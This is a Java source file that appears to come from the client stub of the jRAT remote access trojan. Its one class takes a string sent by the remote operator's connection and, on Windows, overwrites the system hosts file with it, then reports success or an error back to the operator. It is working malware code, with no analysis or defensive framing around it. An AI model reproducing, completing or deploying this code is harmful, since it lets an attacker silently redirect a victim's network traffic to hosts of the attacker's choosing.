package io.jrat.stub.packets.incoming;

import io.jrat.common.OperatingSystem;
import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.Packet39HostEditResult;

import java.io.FileWriter;


public class Packet56UpdateHostsFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String str = Connection.readLine();
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			try {
				FileWriter writer = new FileWriter(System.getenv("SystemDrive") + "\\Windows\\System32\\drivers\\etc\\hosts");
				writer.write(str);
				writer.close();
				Connection.addToSendQueue(new Packet39HostEditResult(""));
			} catch (Exception ex) {
				Connection.addToSendQueue(new Packet39HostEditResult("ERR: " + ex.getMessage()));
			}
		} else {
			Connection.addToSendQueue(new Packet39HostEditResult("ERR: Windows only"));
		}
	}

}
